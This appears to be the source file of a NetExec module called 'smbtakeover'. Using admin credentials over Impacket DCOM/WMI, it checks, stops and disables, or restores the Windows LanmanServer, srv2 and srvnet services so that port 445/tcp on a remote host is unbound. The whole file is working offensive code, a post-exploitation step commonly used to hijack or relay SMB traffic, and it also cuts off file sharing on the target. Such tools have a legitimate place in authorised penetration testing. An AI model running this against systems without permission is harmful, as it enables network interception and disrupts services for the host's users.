from sys import exit

from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY

from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "smbtakeover"
    description = "Unbinds/Rebinds port 445/tcp via SCM interactions strictly over WMI (ncacn_ip_tcp)"
    supported_protocols = ["smb", "wmi"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = "check"

    def options(self, context, module_options):
        """
        ACTION          Unbind/Rebind port 445/tcp (choices: check, stop, start)
                        - check: Enumerates service states (default)
                        - stop: Unbinds 445/tcp (Stops LanmanServer, srv2, srvnet)
                        - start: Rebinds 445/tcp (Restores services)
        """
        if "ACTION" in module_options:
            self.action = module_options["ACTION"].lower()

        if self.action not in ("check", "stop", "start"):
            context.log.fail("Invalid ACTION. Supported choices are: check, stop, start")
            exit(1)

    def on_admin_login(self, context, connection):
        context.log.display(f"Executing smbtakeover '{self.action}' via WMI (ncacn_ip_tcp)...")
        smbtakeover_wmi = SmbTakeoverWmi(context, connection)

        if smbtakeover_wmi.is_initialized:
            try:
                if self.action == "check":
                    smbtakeover_wmi.check()
                else:
                    smbtakeover_wmi.process(action=self.action)
            except Exception as e:
                context.log.fail(f"Execution error: {e!s}")
            finally:
                smbtakeover_wmi.disconnect()


class SmbTakeoverWmi:
    """Handles SCM interactions indirectly over WMI (ncacn_ip_tcp)"""

    def __init__(self, context, connection):
        self.logger = context.log
        self.__context_protocol = context.protocol
        self.__is_initialized = False
        self._i_wbem_services = None
        self.__dcom = None

        try:
            self.__dcom = DCOMConnection(
                target=connection.remoteName,
                username=connection.username,
                password=connection.password,
                domain=connection.domain,
                lmhash=connection.lmhash,
                nthash=connection.nthash,
                aesKey=connection.aesKey,
                oxidResolver=True,
                doKerberos=connection.kerberos,
                kdcHost=connection.kdcHost,
                remoteHost=connection.host,
            )

            i_interface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            self.__iWbemLevel1Login = wmi.IWbemLevel1Login(i_interface)
            self.__is_initialized = True
        except Exception as e:
            self.logger.fail(f"WMI connection failed: {e!s}")
            self.disconnect()

    @property
    def is_initialized(self):
        return self.__is_initialized

    def disconnect(self):
        if self._i_wbem_services:
            try:
                self._i_wbem_services.RemRelease()
            except Exception as e:
                self.logger.debug(f"IWbemServices RemRelease error: {e!s}")
            finally:
                self._i_wbem_services = None

        # Don't disconnect on 'nxc wmi' because NetExec disconnects in the end automatically
        # Disconnect only on 'nxc smb' to keep the WMI connection from hanging
        if self.__dcom and self.__context_protocol != "wmi":
            try:
                self.__dcom.disconnect()
            except Exception as e:
                self.logger.debug(f"DCOM disconnect error: {e!s}")
            finally:
                self.__dcom = None

    @property
    def i_wbem_services(self):
        if self._i_wbem_services is None:
            self._i_wbem_services = self.__iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            self._i_wbem_services.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            self.__iWbemLevel1Login.RemRelease()
        return self._i_wbem_services

    def get_service_or_driver(self, name):
        svc_name_to_table = {"srv2": "Win32_SystemDriver", "srvnet": "Win32_SystemDriver", "LanmanServer": "Win32_Service"}

        try:
            query = f"SELECT * FROM {svc_name_to_table[name]} WHERE Name='{name}'"
            objects = self.i_wbem_services.ExecQuery(query).Next(0xFFFFFFFF, 1)
            if objects:
                return objects[0]
        except Exception as e:
            if "code: 0x1 - WBEM_S_FALSE" in str(e):
                self.logger.debug(f"Object '{name}' not found in {svc_name_to_table[name]} (WBEM_S_FALSE)")
            else:
                self.logger.fail(f"Unexpected WMI error checking {svc_name_to_table[name]}: {e!s}")
        return None

    def call_wmi_method(self, obj, method_name, *args):
        try:
            out = getattr(obj, method_name)(*args)
            if isinstance(out, int):
                return out
            if out is None:
                return None
            props = dict(out.getProperties())
            return props.get("ReturnValue", {}).get("value", None)
        except Exception as e:
            self.logger.fail(f"Error executing {method_name}: {e!s}")
            return None

    def change_start_mode(self, service_obj, mode, service_name):
        ret = self.call_wmi_method(service_obj, "ChangeStartMode", mode)
        if ret == 0:
            self.logger.success(f"[{service_name}] StartMode changed to {mode}")
        else:
            self.logger.fail(f"[{service_name}] Failed to set StartMode (Ret: {ret})")

    def stop_service(self, service_obj, service_name):
        ret = self.call_wmi_method(service_obj, "StopService")
        if ret == 0:
            self.logger.success(f"[{service_name}] Stopped successfully")
        elif ret == 5:
            self.logger.info(f"[{service_name}] Already stopped")
        else:
            self.logger.fail(f"[{service_name}] Failed to stop (Ret: {ret})")

    def start_service(self, service_obj, service_name):
        ret = self.call_wmi_method(service_obj, "StartService")
        if ret == 0:
            self.logger.success(f"[{service_name}] Started successfully")
        elif ret == 10:
            self.logger.info(f"[{service_name}] Already running")
        else:
            self.logger.fail(f"[{service_name}] Failed to start (Ret: {ret})")

    def check_service(self, service_name):
        svc_obj = self.get_service_or_driver(service_name)
        if svc_obj:
            props = dict(svc_obj.getProperties())
            state = props.get("State", {}).get("value", "Unknown")
            start_mode = props.get("StartMode", {}).get("value", "Unknown")
            return (svc_obj, state, start_mode)
        else:
            self.logger.fail(f"[{service_name}] Not found!")
        return (None, None, None)

    def check(self) -> dict:
        statuses = {}
        for svc_name in ("LanmanServer", "srv2", "srvnet"):
            _, state, start_mode = self.check_service(svc_name)
            statuses[svc_name] = {"state": state, "start_mode": start_mode}
            self.logger.highlight(f"[{svc_name}] State: {state} | StartMode: {start_mode}")
        return statuses

    def process(self, action: str):
        """
        Unified SMB control logic via WMI.
        'stop'  sequence: LanmanServer -> srv2 -> srvnet
        'start' sequence: srvnet -> srv2 -> LanmanServer
        """
        is_start = action == "start"
        services = ["LanmanServer", "srv2", "srvnet"]
        if is_start:
            services.reverse()

        target_state = "Running" if is_start else "Stopped"
        lanman_mode = "Automatic" if is_start else "Disabled"
        lanman_check = "Auto" if is_start else "Disabled"

        for svc_name in services:
            svc_obj, state, start_mode = self.check_service(svc_name)
            if svc_obj:
                if svc_name == "LanmanServer" and start_mode != lanman_check:
                    self.change_start_mode(svc_obj, lanman_mode, svc_name)

                if state != target_state:
                    self.start_service(svc_obj, svc_name) if is_start else self.stop_service(svc_obj, svc_name)

        failed = False
        statuses = self.check()
        self.logger.info(statuses)
        if statuses["LanmanServer"]["start_mode"] != lanman_check:
            failed = True
        else:
            for svc_name in statuses:
                if statuses[svc_name]["state"] != target_state:
                    failed = True
                    break

        msg = "rebind" if is_start else "unbind"

        if failed:
            self.logger.fail(f"SMB {msg} sequence failed.")
        else:
            status = "restored" if is_start else "free"
            self.logger.success(f"SMB {msg} sequence completed. Port 445/tcp {status}.")
